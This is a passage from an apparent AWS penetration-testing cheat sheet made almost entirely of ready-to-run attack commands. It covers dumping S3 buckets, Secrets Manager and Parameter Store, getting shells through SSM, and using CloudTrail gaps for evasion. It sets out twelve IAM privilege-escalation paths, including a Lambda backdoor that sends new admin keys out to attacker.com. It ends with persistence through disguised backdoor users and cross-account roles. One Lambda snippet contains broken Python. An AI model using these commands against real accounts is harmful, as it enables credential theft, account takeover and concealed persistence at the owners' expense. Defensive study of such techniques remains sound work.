    echo "$ACL" | jq '.Grants[] | select(.Grantee.URI != null)'
  fi
  
  # Check policy for public access
  POLICY=$(aws s3api get-bucket-policy --bucket $bucket --output text 2>/dev/null)
  if echo "$POLICY" | grep -q '"Principal": "\*"\|"Principal":{"AWS":"\*"}'; then
    echo "[!] PUBLIC POLICY DETECTED!"
  fi
  
  # Check public access block
  BLOCK=$(aws s3api get-public-access-block --bucket $bucket 2>/dev/null)
  if echo "$BLOCK" | grep -q '"false"'; then
    echo "[!] PUBLIC ACCESS BLOCK NOT FULLY ENABLED!"
  fi
  
  echo ""
done

# ============================================
# DOWNLOAD INTERESTING FILES
# ============================================

# Search for sensitive files
aws s3 ls s3://$BUCKET --recursive | grep -iE '\.env|\.git|\.config|\.pem|\.key|\.sql|\.bak|\.zip|\.tar|password|secret|credential|backup|dump|database|terraform'

# Download specific files
aws s3 cp s3://$BUCKET/path/to/secrets.env ./secrets.env
aws s3 cp s3://$BUCKET/.git/ ./stolen_git/ --recursive

# Sync entire bucket
aws s3 sync s3://$BUCKET ./bucket_dump/

# ============================================
# CHECK OBJECT-LEVEL PERMISSIONS
# ============================================
aws s3api get-object-acl --bucket $BUCKET --key <OBJECT_KEY>

# Try to upload (test write access)
echo "test" > /tmp/test.txt
aws s3 cp /tmp/test.txt s3://$BUCKET/test_upload.txt
# If succeeds → writable bucket!

# Try to delete
aws s3 rm s3://$BUCKET/test_upload.txt
```

### S3 Bucket Privilege Escalation

```bash [Terminal]
# ============================================
# MODIFY BUCKET POLICY (If you have s3:PutBucketPolicy)
# ============================================

# Make bucket public
cat > /tmp/public_policy.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [{
    "Sid": "PublicRead",
    "Effect": "Allow",
    "Principal": "*",
    "Action": "s3:GetObject",
    "Resource": "arn:aws:s3:::TARGET-BUCKET/*"
  }]
}
EOF
aws s3api put-bucket-policy --bucket TARGET-BUCKET --policy file:///tmp/public_policy.json

# ============================================
# ACCESS VERSIONED OBJECTS (Deleted data)
# ============================================

# List object versions (may contain deleted sensitive files)
aws s3api list-object-versions --bucket $BUCKET

# Download a specific version
aws s3api get-object --bucket $BUCKET --key secret.txt --version-id <VERSION_ID> secret_old_version.txt

# ============================================
# PRE-SIGNED URL GENERATION (Temporary access)
# ============================================
aws s3 presign s3://$BUCKET/sensitive_file.pdf --expires-in 3600
# Generates URL that anyone can access for 1 hour
```

---

## EC2 Enumeration

```bash [Terminal]
# ============================================
# LIST EC2 INSTANCES
# ============================================
aws ec2 describe-instances
aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,InstanceType,State.Name,PublicIpAddress,PrivateIpAddress,KeyName,Tags[?Key==`Name`].Value|[0]]' --output table

# All regions
for region in $(aws ec2 describe-regions --query 'Regions[*].RegionName' --output text); do
  echo "=== Region: $region ==="
  aws ec2 describe-instances --region $region --query 'Reservations[*].Instances[*].[InstanceId,InstanceType,State.Name,PublicIpAddress,PrivateIpAddress]' --output table 2>/dev/null
done

# ============================================
# INSTANCE DETAILS
# ============================================

# Security groups
aws ec2 describe-instances --instance-ids <INSTANCE_ID> --query 'Reservations[*].Instances[*].SecurityGroups'

# IAM role attached
aws ec2 describe-instances --instance-ids <INSTANCE_ID> --query 'Reservations[*].Instances[*].IamInstanceProfile'

# User data (bootstrap scripts — may contain secrets!)
aws ec2 describe-instance-attribute --instance-id <INSTANCE_ID> --attribute userData --query 'UserData.Value' --output text | base64 -d

# Key pairs
aws ec2 describe-key-pairs

# ============================================
# SECURITY GROUPS (FIREWALL RULES)
# ============================================
aws ec2 describe-security-groups
aws ec2 describe-security-groups --query 'SecurityGroups[*].[GroupId,GroupName,Description]' --output table

# Find overly permissive security groups
aws ec2 describe-security-groups --query 'SecurityGroups[*].IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`]]' --output json

# Find SGs allowing SSH from anywhere
aws ec2 describe-security-groups --filters "Name=ip-permission.from-port,Values=22" "Name=ip-permission.cidr,Values=0.0.0.0/0"

# Find SGs allowing RDP from anywhere
aws ec2 describe-security-groups --filters "Name=ip-permission.from-port,Values=3389" "Name=ip-permission.cidr,Values=0.0.0.0/0"

# ============================================
# AMIs (Amazon Machine Images)
# ============================================
aws ec2 describe-images --owners self
aws ec2 describe-images --owners self --query 'Images[*].[ImageId,Name,Public]' --output table

# Find public AMIs (data leak!)
aws ec2 describe-images --owners self --filters "Name=is-public,Values=true"

# ============================================
# EBS VOLUMES & SNAPSHOTS
# ============================================
aws ec2 describe-volumes
aws ec2 describe-snapshots --owner-ids self
aws ec2 describe-snapshots --owner-ids self --query 'Snapshots[*].[SnapshotId,Description,VolumeSize,Encrypted]' --output table

# Find public snapshots (data leak!)
aws ec2 describe-snapshots --restorable-by-user-ids all --owner-ids self

# ============================================
# ELASTIC IPs
# ============================================
aws ec2 describe-addresses

# ============================================
# VPN / NETWORK
# ============================================
aws ec2 describe-vpn-connections
aws ec2 describe-vpn-gateways
aws ec2 describe-network-interfaces
```

### EC2 Instance Connect / SSM Access

```bash [Terminal]
# ============================================
# SSM (Systems Manager) — Shell without SSH
# ============================================

# List managed instances
aws ssm describe-instance-information
aws ssm describe-instance-information --query 'InstanceInformationList[*].[InstanceId,PingStatus,PlatformType,PlatformName]' --output table

# Start SSM session (interactive shell)
aws ssm start-session --target <INSTANCE_ID>

# Run command on instance(s)
aws ssm send-command --instance-ids <INSTANCE_ID> --document-name "AWS-RunShellScript" --parameters '{"commands":["whoami","id","cat /etc/shadow"]}'

# Get command output
aws ssm get-command-invocation --command-id <COMMAND_ID> --instance-id <INSTANCE_ID>

# Run on multiple instances
aws ssm send-command --targets "Key=tag:Name,Values=WebServer" --document-name "AWS-RunShellScript" --parameters '{"commands":["hostname"]}'

# ============================================
# EC2 INSTANCE CONNECT (SSH key injection)
# ============================================

# Push SSH key to instance (60 second window)
aws ec2-instance-connect send-ssh-public-key --instance-id <INSTANCE_ID> --instance-os-user ec2-user --ssh-public-key file://~/.ssh/id_rsa.pub --availability-zone <AZ>

# Then SSH immediately
ssh -i ~/.ssh/id_rsa ec2-user@<PUBLIC_IP>
```

---

## Lambda Enumeration

```bash [Terminal]
# ============================================
# LIST LAMBDA FUNCTIONS
# ============================================
aws lambda list-functions
aws lambda list-functions --query 'Functions[*].[FunctionName,Runtime,Role,Handler]' --output table

# All regions
for region in $(aws ec2 describe-regions --query 'Regions[*].RegionName' --output text); do
  FUNCS=$(aws lambda list-functions --region $region --query 'Functions[*].FunctionName' --output text 2>/dev/null)
  if [ ! -z "$FUNCS" ]; then
    echo "=== Region: $region ==="
    echo "$FUNCS"
  fi
done

# ============================================
# FUNCTION DETAILS
# ============================================

# Get function configuration
aws lambda get-function --function-name <FUNCTION_NAME>

# Get function code (download!)
aws lambda get-function --function-name <FUNCTION_NAME> --query 'Code.Location' --output text
# Returns a pre-signed URL to download the function code ZIP

# Download the code
wget -O function_code.zip "$(aws lambda get-function --function-name <FUNCTION_NAME> --query 'Code.Location' --output text)"
unzip function_code.zip -d ./lambda_code/

# ============================================
# ENVIRONMENT VARIABLES (OFTEN CONTAIN SECRETS!)
# ============================================
aws lambda get-function-configuration --function-name <FUNCTION_NAME> --query 'Environment.Variables'

# Search all functions for secrets in env vars
for func in $(aws lambda list-functions --query 'Functions[*].FunctionName' --output text); do
  echo "=== $func ==="
  aws lambda get-function-configuration --function-name $func --query 'Environment.Variables' 2>/dev/null
done

# ============================================
# FUNCTION POLICY (Who can invoke)
# ============================================
aws lambda get-policy --function-name <FUNCTION_NAME>

# ============================================
# LAYERS (Shared code libraries)
# ============================================
aws lambda list-layers
aws lambda list-layer-versions --layer-name <LAYER_NAME>
aws lambda get-layer-version --layer-name <LAYER_NAME> --version-number 1

# ============================================
# EVENT SOURCE MAPPINGS
# ============================================
aws lambda list-event-source-mappings --function-name <FUNCTION_NAME>

# ============================================
# INVOKE FUNCTION (If you have permission)
# ============================================
aws lambda invoke --function-name <FUNCTION_NAME> --payload '{"key":"value"}' output.json
cat output.json
```

---

## Secrets & Parameter Store Enumeration

::warning
**AWS Secrets Manager** and **SSM Parameter Store** are treasure troves of credentials, API keys, database passwords, and configuration secrets.
::

```bash [Terminal]
# ============================================
# SECRETS MANAGER
# ============================================

# List all secrets
aws secretsmanager list-secrets
aws secretsmanager list-secrets --query 'SecretList[*].[Name,Description]' --output table

# Get secret value (THE JACKPOT!)
aws secretsmanager get-secret-value --secret-id <SECRET_NAME>
aws secretsmanager get-secret-value --secret-id <SECRET_NAME> --query 'SecretString' --output text

# Get all secret values
for secret in $(aws secretsmanager list-secrets --query 'SecretList[*].Name' --output text); do
  echo "=== SECRET: $secret ==="
  aws secretsmanager get-secret-value --secret-id $secret --query 'SecretString' --output text 2>/dev/null
  echo ""
done

# ============================================
# SSM PARAMETER STORE
# ============================================

# List all parameters
aws ssm describe-parameters
aws ssm describe-parameters --query 'Parameters[*].[Name,Type,Description]' --output table

# Get parameter value
aws ssm get-parameter --name <PARAMETER_NAME>
aws ssm get-parameter --name <PARAMETER_NAME> --with-decryption  # For SecureString

# Get all parameters (recursive)
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption

# Search for interesting parameters
aws ssm describe-parameters --parameter-filters "Key=Name,Values=password,Option=Contains"
aws ssm describe-parameters --parameter-filters "Key=Name,Values=secret,Option=Contains"
aws ssm describe-parameters --parameter-filters "Key=Name,Values=key,Option=Contains"
aws ssm describe-parameters --parameter-filters "Key=Name,Values=token,Option=Contains"
aws ssm describe-parameters --parameter-filters "Key=Name,Values=credential,Option=Contains"

# Dump all parameter values
for param in $(aws ssm describe-parameters --query 'Parameters[*].Name' --output text); do
  echo "=== $param ==="
  aws ssm get-parameter --name "$param" --with-decryption --query 'Parameter.Value' --output text 2>/dev/null
  echo ""
done
```

---

## Database Enumeration (RDS, DynamoDB, Redshift)

```bash [Terminal]
# ============================================
# RDS (Relational Database Service)
# ============================================

# List RDS instances
aws rds describe-db-instances
aws rds describe-db-instances --query 'DBInstances[*].[DBInstanceIdentifier,Engine,EngineVersion,Endpoint.Address,Endpoint.Port,PubliclyAccessible,MasterUsername]' --output table

# Find publicly accessible databases!
aws rds describe-db-instances --query 'DBInstances[?PubliclyAccessible==`true`].[DBInstanceIdentifier,Engine,Endpoint.Address]' --output table

# List RDS snapshots
aws rds describe-db-snapshots --query 'DBSnapshots[*].[DBSnapshotIdentifier,DBInstanceIdentifier,Engine,SnapshotType]' --output table

# Find public snapshots
aws rds describe-db-snapshots --snapshot-type public

# RDS cluster (Aurora)
aws rds describe-db-clusters

# Subnet groups
aws rds describe-db-subnet-groups

# ============================================
# DYNAMODB
# ============================================

# List tables
aws dynamodb list-tables

# Describe table
aws dynamodb describe-table --table-name <TABLE_NAME>

# Scan table (dump all data!)
aws dynamodb scan --table-name <TABLE_NAME>
aws dynamodb scan --table-name <TABLE_NAME> --output json > dynamodb_dump.json

# Query specific items
aws dynamodb query --table-name <TABLE_NAME> --key-condition-expression "userId = :uid" --expression-attribute-values '{":uid":{"S":"admin"}}'

# ============================================
# REDSHIFT
# ============================================
aws redshift describe-clusters
aws redshift describe-clusters --query 'Clusters[*].[ClusterIdentifier,Endpoint.Address,Endpoint.Port,MasterUsername,PubliclyAccessible]' --output table

# ============================================
# ELASTICACHE (Redis/Memcached)
# ============================================
aws elasticache describe-cache-clusters
aws elasticache describe-replication-groups

# ============================================
# ELASTICSEARCH / OPENSEARCH
# ============================================
aws es list-domain-names
aws es describe-elasticsearch-domain --domain-name <DOMAIN_NAME>
aws opensearch list-domain-names
aws opensearch describe-domain --domain-name <DOMAIN_NAME>
```

---

## VPC & Network Enumeration

```bash [Terminal]
# ============================================
# VPCs
# ============================================
aws ec2 describe-vpcs
aws ec2 describe-vpcs --query 'Vpcs[*].[VpcId,CidrBlock,IsDefault,Tags[?Key==`Name`].Value|[0]]' --output table

# ============================================
# SUBNETS
# ============================================
aws ec2 describe-subnets
aws ec2 describe-subnets --query 'Subnets[*].[SubnetId,VpcId,CidrBlock,AvailabilityZone,MapPublicIpOnLaunch]' --output table

# Find public subnets
aws ec2 describe-subnets --query 'Subnets[?MapPublicIpOnLaunch==`true`].[SubnetId,CidrBlock]' --output table

# ============================================
# SECURITY GROUPS (DETAILED)
# ============================================

# All security group rules
aws ec2 describe-security-groups --query 'SecurityGroups[*].[GroupId,GroupName,IpPermissions]' --output json

# Find wide-open security groups (0.0.0.0/0 inbound)
aws ec2 describe-security-groups --query 'SecurityGroups[].{ID:GroupId,Name:GroupName,OpenPorts:IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`]].{FromPort:FromPort,ToPort:ToPort}}' --output json

# Find all ports open to the world
for sg in $(aws ec2 describe-security-groups --query 'SecurityGroups[*].GroupId' --output text); do
  RULES=$(aws ec2 describe-security-groups --group-ids $sg --query 'SecurityGroups[*].IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`]]' --output json)
  if [ "$RULES" != "[[]]" ] && [ "$RULES" != "[]" ]; then
    echo "[!] SG $sg has rules open to 0.0.0.0/0"
    echo "$RULES" | jq '.[][][]? | {FromPort, ToPort, Protocol: .IpProtocol}'
  fi
done

# ============================================
# INTERNET GATEWAYS
# ============================================
aws ec2 describe-internet-gateways

# ============================================
# NAT GATEWAYS
# ============================================
aws ec2 describe-nat-gateways

# ============================================
# ROUTE TABLES
# ============================================
aws ec2 describe-route-tables

# ============================================
# NETWORK ACLs
# ============================================
aws ec2 describe-network-acls

# ============================================
# LOAD BALANCERS
# ============================================

# Classic ELB
aws elb describe-load-balancers

# ALB / NLB
aws elbv2 describe-load-balancers
aws elbv2 describe-load-balancers --query 'LoadBalancers[*].[LoadBalancerName,DNSName,Type,Scheme]' --output table

# Target groups
aws elbv2 describe-target-groups

# ============================================
# VPC ENDPOINTS (PrivateLink)
# ============================================
aws ec2 describe-vpc-endpoints

# ============================================
# VPC PEERING
# ============================================
aws ec2 describe-vpc-peering-connections

# ============================================
# TRANSIT GATEWAY
# ============================================
aws ec2 describe-transit-gateways
```

---

## Additional Service Enumeration

::code-collapse

```bash [Terminal]
# ============================================
# ECS (Elastic Container Service)
# ============================================
aws ecs list-clusters
aws ecs describe-clusters --clusters <CLUSTER_ARN>
aws ecs list-services --cluster <CLUSTER_ARN>
aws ecs describe-services --cluster <CLUSTER_ARN> --services <SERVICE_ARN>
aws ecs list-tasks --cluster <CLUSTER_ARN>
aws ecs describe-tasks --cluster <CLUSTER_ARN> --tasks <TASK_ARN>
aws ecs describe-task-definition --task-definition <TASK_DEF>
# Task definitions may contain environment variables with secrets!

# ============================================
# EKS (Elastic Kubernetes Service)
# ============================================
aws eks list-clusters
aws eks describe-cluster --name <CLUSTER_NAME>
aws eks update-kubeconfig --name <CLUSTER_NAME>
kubectl get namespaces
kubectl get pods --all-namespaces
kubectl get secrets --all-namespaces

# ============================================
# ECR (Elastic Container Registry)
# ============================================
aws ecr describe-repositories
aws ecr list-images --repository-name <REPO_NAME>
aws ecr get-login-password | docker login --username AWS --password-stdin <ACCOUNT_ID>.dkr.ecr.<REGION>.amazonaws.com
docker pull <ACCOUNT_ID>.dkr.ecr.<REGION>.amazonaws.com/<REPO>:<TAG>

# ============================================
# CLOUDFORMATION (Infrastructure as Code)
# ============================================
aws cloudformation list-stacks
aws cloudformation describe-stacks
aws cloudformation get-template --stack-name <STACK_NAME>
# Templates may contain hardcoded secrets!
aws cloudformation describe-stack-events --stack-name <STACK_NAME>

# ============================================
# SNS (Simple Notification Service)
# ============================================
aws sns list-topics
aws sns list-subscriptions
aws sns get-topic-attributes --topic-arn <TOPIC_ARN>

# ============================================
# SQS (Simple Queue Service)
# ============================================
aws sqs list-queues
aws sqs get-queue-attributes --queue-url <QUEUE_URL> --attribute-names All
aws sqs receive-message --queue-url <QUEUE_URL>

# ============================================
# COGNITO (User Pools / Identity Pools)
# ============================================
aws cognito-idp list-user-pools --max-results 60
aws cognito-idp describe-user-pool --user-pool-id <POOL_ID>
aws cognito-idp list-users --user-pool-id <POOL_ID>
aws cognito-identity list-identity-pools --max-results 60
aws cognito-identity describe-identity-pool --identity-pool-id <POOL_ID>

# ============================================
# API GATEWAY
# ============================================
aws apigateway get-rest-apis
aws apigateway get-resources --rest-api-id <API_ID>
aws apigateway get-stages --rest-api-id <API_ID>
aws apigateway get-api-keys --include-values
# API keys are often overly permissive!

# ============================================
# ROUTE 53 (DNS)
# ============================================
aws route53 list-hosted-zones
aws route53 list-resource-record-sets --hosted-zone-id <ZONE_ID>

# ============================================
# CLOUDWATCH (Logs — may contain secrets)
# ============================================
aws logs describe-log-groups
aws logs describe-log-streams --log-group-name <LOG_GROUP>
aws logs get-log-events --log-group-name <LOG_GROUP> --log-stream-name <STREAM>
aws logs filter-log-events --log-group-name <LOG_GROUP> --filter-pattern "password"
aws logs filter-log-events --log-group-name <LOG_GROUP> --filter-pattern "secret"
aws logs filter-log-events --log-group-name <LOG_GROUP> --filter-pattern "key"

# ============================================
# SES (Simple Email Service)
# ============================================
aws ses list-identities
aws ses get-send-statistics

# ============================================
# KMS (Key Management Service)
# ============================================
aws kms list-keys
aws kms list-aliases
aws kms describe-key --key-id <KEY_ID>
aws kms list-key-policies --key-id <KEY_ID>
aws kms get-key-policy --key-id <KEY_ID> --policy-name default

# ============================================
# ORGANIZATIONS (If management account)
# ============================================
aws organizations describe-organization
aws organizations list-accounts
aws organizations list-roots
```

::

---

## CloudTrail & Logging Enumeration

::note
**CloudTrail** logs all AWS API calls. Understanding what's logged — and what's NOT — is crucial for both attackers (evasion) and defenders (detection).
::

```bash [Terminal]
# ============================================
# CLOUDTRAIL STATUS
# ============================================

# List trails
aws cloudtrail describe-trails
aws cloudtrail describe-trails --query 'trailList[*].[Name,S3BucketName,IsMultiRegionTrail,IsLogging,LogFileValidationEnabled,KmsKeyId]' --output table

# Check if trail is actually logging
aws cloudtrail get-trail-status --name <TRAIL_NAME>

# Get event selectors (what's being logged)
aws cloudtrail get-event-selectors --trail-name <TRAIL_NAME>

# ============================================
# CLOUDTRAIL EVASION — ACTIONS NOT LOGGED
# ============================================
# Some API calls are NOT logged in CloudTrail by default:
# - sts:GetCallerIdentity (reconnaissance)
# - sts:GetAccessKeyInfo (key → account ID mapping)
# - iam:SimulatePrincipalPolicy (permission testing)
# - s3:HeadBucket (bucket existence check)
# - Most Read-only data events (unless data events enabled)

# ============================================
# GUARDDUTY STATUS
# ============================================
aws guardduty list-detectors
aws guardduty get-detector --detector-id <DETECTOR_ID>
aws guardduty list-findings --detector-id <DETECTOR_ID>

# ============================================
# CONFIG (AWS Config — compliance checking)
# ============================================
aws configservice describe-configuration-recorders
aws configservice describe-compliance-by-config-rule

# ============================================
# SECURITY HUB
# ============================================
aws securityhub get-findings --filters '{"SeverityLabel":[{"Value":"CRITICAL","Comparison":"EQUALS"}]}'
```

---

## IAM Privilege Escalation

::caution
**IAM privilege escalation** is the most critical phase of AWS penetration testing. Over **20 known escalation paths** exist through misconfigured IAM permissions.
::

### Permission Enumeration First

```bash [Terminal]
# ============================================
# ENUMERATE WHAT YOU CAN DO
# ============================================

# Method 1: enumerate-iam (brute force all API calls)
git clone https://github.com/andresriancho/enumerate-iam.git
cd enumerate-iam
python3 enumerate-iam.py --access-key AKIA... --secret-key ...

# Method 2: Pacu (AWS exploitation framework)
pip3 install pacu
pacu
> import_keys stolen
> run iam__enum_permissions

# Method 3: AWS CLI policy simulator
aws iam simulate-principal-policy --policy-source-arn <USER_ARN> --action-names iam:CreateUser iam:AttachUserPolicy s3:GetObject ec2:RunInstances lambda:CreateFunction sts:AssumeRole

# Method 4: ScoutSuite (full audit)
pip3 install scoutsuite
scout aws --profile stolen

# Method 5: Prowler (security assessment)
pip3 install prowler
prowler aws
```

### Known Privilege Escalation Paths

::accordion

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Path 1 — iam:CreatePolicyVersion (Direct Policy Escalation)"
  ---

  **If you can create a new version of an existing policy, you can give yourself admin.**

  **Required Permission:** `iam:CreatePolicyVersion`

  ```bash [Terminal]
  # Create admin policy version
  aws iam create-policy-version --policy-arn <POLICY_ARN> --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }]
  }' --set-as-default
  ```

  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Path 2 — iam:SetDefaultPolicyVersion (Restore Older Permissions)"
  ---

  **If a policy has an older version with more permissions, set it as default.**

  **Required Permission:** `iam:SetDefaultPolicyVersion`

  ```bash [Terminal]
  # List versions
  aws iam list-policy-versions --policy-arn <POLICY_ARN>

  # Check older version for admin perms
  aws iam get-policy-version --policy-arn <POLICY_ARN> --version-id v1

  # Set permissive version as default
  aws iam set-default-policy-version --policy-arn <POLICY_ARN> --version-id v1
  ```

  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Path 3 — iam:AttachUserPolicy / iam:AttachGroupPolicy / iam:AttachRolePolicy"
  ---

  **Attach AdministratorAccess policy to yourself.**

  ```bash [Terminal]
  # Attach admin policy to your user
  aws iam attach-user-policy --user-name <YOUR_USER> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

  # Or to your group
  aws iam attach-group-policy --group-name <YOUR_GROUP> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

  # Or to a role you can assume
  aws iam attach-role-policy --role-name <ROLE_NAME> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
  ```

  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Path 4 — iam:PutUserPolicy / iam:PutGroupPolicy / iam:PutRolePolicy"
  ---

  **Add inline admin policy to yourself.**

  ```bash [Terminal]
  aws iam put-user-policy --user-name <YOUR_USER> --policy-name AdminAccess --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }]
  }'
  ```

  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Path 5 — iam:CreateUser + iam:CreateAccessKey"
  ---

  **Create a new admin user.**

  ```bash [Terminal]
  aws iam create-user --user-name backdoor
  aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
  aws iam create-access-key --user-name backdoor
  # Use the new access key pair
  ```

  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Path 6 — iam:CreateLoginProfile / iam:UpdateLoginProfile"
  ---

  **Set/change console password for any user.**

  ```bash [Terminal]
  # Set password for existing user (console access)
  aws iam create-login-profile --user-name admin --password 'NewP@ssw0rd!'
  
  # Or update existing password
  aws iam update-login-profile --user-name admin --password 'NewP@ssw0rd!'

  # Then login at: https://<ACCOUNT_ID>.signin.aws.amazon.com/console
  ```

  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Path 7 — iam:CreateAccessKey"
  ---

  **Create access keys for another (more privileged) user.**

  ```bash [Terminal]
  # Create access key for admin user
  aws iam create-access-key --user-name administrator
  # Use the new keys to operate as that user
  ```

  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Path 8 — sts:AssumeRole (Cross-Account / Escalation)"
  ---

  **Assume a more privileged role.**

  ```bash [Terminal]
  # Find roles you can assume
  for role in $(aws iam list-roles --query 'Roles[*].RoleName' --output text); do
    TRUST=$(aws iam get-role --role-name $role --query 'Role.AssumeRolePolicyDocument' --output json 2>/dev/null)
    if echo "$TRUST" | grep -q "$(aws sts get-caller-identity --query 'Arn' --output text)"; then
      echo "[+] Can assume: $role"
    fi
  done

  # Assume the role
  aws sts assume-role --role-arn arn:aws:iam::<ACCOUNT>:role/<ADMIN_ROLE> --role-session-name hacked
  ```

  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Path 9 — Lambda + iam:PassRole (Code Execution as Role)"
  ---

  **Create a Lambda function that runs with a privileged role.**

  ```bash [Terminal]
  # Create Lambda function with admin role
  cat > /tmp/lambda_privesc.py << 'PYEOF'
  import boto3, json
  def handler(event, context):
      client = boto3.client('iam')
      client.attach-user-policy(
          UserName='<YOUR_USER>',
          PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
      )
      return {'statusCode': 200, 'body': 'Escalated!'}
  PYEOF

  zip /tmp/lambda_privesc.zip /tmp/lambda_privesc.py

  aws lambda create-function \
    --function-name privesc \
    --runtime python3.9 \
    --role arn:aws:iam::<ACCOUNT>:role/<ADMIN_ROLE> \
    --handler lambda_privesc.handler \
    --zip-file fileb:///tmp/lambda_privesc.zip

  # Invoke it
  aws lambda invoke --function-name privesc /tmp/output.json
  ```

  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Path 10 — EC2 + iam:PassRole (Instance with Admin Role)"
  ---

  **Launch EC2 instance with admin role, then access metadata for creds.**

  ```bash [Terminal]
  # Create instance profile with admin role
  aws iam create-instance-profile --instance-profile-name AdminProfile
  aws iam add-role-to-instance-profile --instance-profile-name AdminProfile --role-name <ADMIN_ROLE>

  # Launch EC2 with that profile
  aws ec2 run-instances --image-id ami-12345678 --instance-type t2.micro --iam-instance-profile Name=AdminProfile --key-name <KEY_NAME>

  # SSH in and grab creds from metadata
  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ADMIN_ROLE>
  ```

  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Path 11 — CloudFormation + iam:PassRole"
  ---

  **Create CloudFormation stack with admin role that creates resources.**

  ```bash [Terminal]
  aws cloudformation create-stack --stack-name privesc --template-body '{
    "Resources": {
      "AdminUser": {
        "Type": "AWS::IAM::User",
        "Properties": {
          "UserName": "cf-backdoor",
          "ManagedPolicyArns": ["arn:aws:iam::aws:policy/AdministratorAccess"]
        }
      },
      "AdminKey": {
        "Type": "AWS::IAM::AccessKey",
        "Properties": {"UserName": {"Ref": "AdminUser"}}
      }
    },
    "Outputs": {
      "AccessKey": {"Value": {"Ref": "AdminKey"}},
      "SecretKey": {"Value": {"Fn::GetAtt": ["AdminKey", "SecretAccessKey"]}}
    }
  }' --role-arn arn:aws:iam::<ACCOUNT>:role/<ADMIN_ROLE> --capabilities CAPABILITY_NAMED_IAM

  # Get the outputs (new admin keys)
  aws cloudformation describe-stacks --stack-name privesc --query 'Stacks[0].Outputs'
  ```

  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Path 12 — Modify Existing Lambda Code"
  ---

  **If you can update Lambda function code, inject your own code that runs with the function's role.**

  ```bash [Terminal]
  # Update existing Lambda function code
  cat > /tmp/backdoor.py << 'PYEOF'
  import boto3, os, json
  def handler(event, context):
      # Original function code here...
      
      # Backdoor: create admin user
      iam = boto3.client('iam')
      iam.create_user(UserName='lambda-backdoor')
      iam.attach_user_policy(UserName='lambda-backdoor', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
      keys = iam.create_access_key(UserName='lambda-backdoor')
      
      # Exfiltrate keys
      import urllib.request
      urllib.request.urlopen(f"https://attacker.com/steal?ak={keys['AccessKey']['AccessKeyId']}&sk={keys['AccessKey']['SecretAccessKey']}")
      
      return {'statusCode': 200}
  PYEOF

  zip /tmp/backdoor.zip /tmp/backdoor.py
  aws lambda update-function-code --function-name <FUNCTION_NAME> --zip-file fileb:///tmp/backdoor.zip
  ```

  :::

::

### Automated Privilege Escalation Tools

```bash [Terminal]
# ============================================
# PACU — AWS EXPLOITATION FRAMEWORK
# ============================================
pip3 install pacu
pacu

# Import credentials
Pacu> import_keys stolen

# Enumerate permissions
Pacu> run iam__enum_permissions

# Check for privesc paths
Pacu> run iam__privesc_scan

# Execute privilege escalation
Pacu> run iam__privesc_scan --scan-only false

# Other useful Pacu modules
Pacu> run iam__enum_users_roles_policies_groups
Pacu> run s3__enum
Pacu> run ec2__enum
Pacu> run lambda__enum
Pacu> run secrets__enum

# ============================================
# PMAPPER — IAM POLICY ANALYSIS
# ============================================
pip3 install principalmapper

# Graph the IAM environment
pmapper graph --create
pmapper visualize --filetype svg

# Find privesc paths
pmapper analysis --output-type text

# Query specific escalation
pmapper query "who can do iam:CreateUser"
pmapper query "can user/compromised-user do iam:* with *"

# ============================================
# CLOUDSPLAINING — IAM RISK ASSESSMENT
# ============================================
pip3 install cloudsplaining

# Download IAM data
cloudsplaining download --profile stolen

# Scan for issues
cloudsplaining scan --input-file default.json --output results/

# ============================================
# RHINO SECURITY LABS — AWS_ESCALATE
# ============================================
python3 aws_escalate.py --all-users --profile stolen
```

---

## Post-Exploitation & Persistence

::caution
After gaining elevated privileges, establish persistence and extract maximum value from the AWS environment.
::

### Persistence Techniques

::accordion

  :::accordion-item
  ---
  icon: i-lucide-anchor
  label: "Create Backdoor IAM User"
  ---

  ```bash [Terminal]
  # Create user with admin access
  aws iam create-user --user-name support-service-account
  aws iam attach-user-policy --user-name support-service-account --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
  aws iam create-access-key --user-name support-service-account

  # Make it look legitimate with tags
  aws iam tag-user --user-name support-service-account --tags Key=Department,Value=IT Key=Purpose,Value="Service Account"
  ```

  :::

  :::accordion-item
  ---
  icon: i-lucide-anchor
  label: "Create Backdoor IAM Role (Cross-Account)"
  ---

  ```bash [Terminal]
  # Create role that YOUR AWS account can assume
  aws iam create-role --role-name OrganizationAuditRole --assume-role-policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Principal": {"AWS": "arn:aws:iam::<YOUR_ACCOUNT_ID>:root"},
      "Action": "sts:AssumeRole"
    }]
  }'

  aws iam attach-role-policy --role-name OrganizationAuditRole --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

  # From your account:
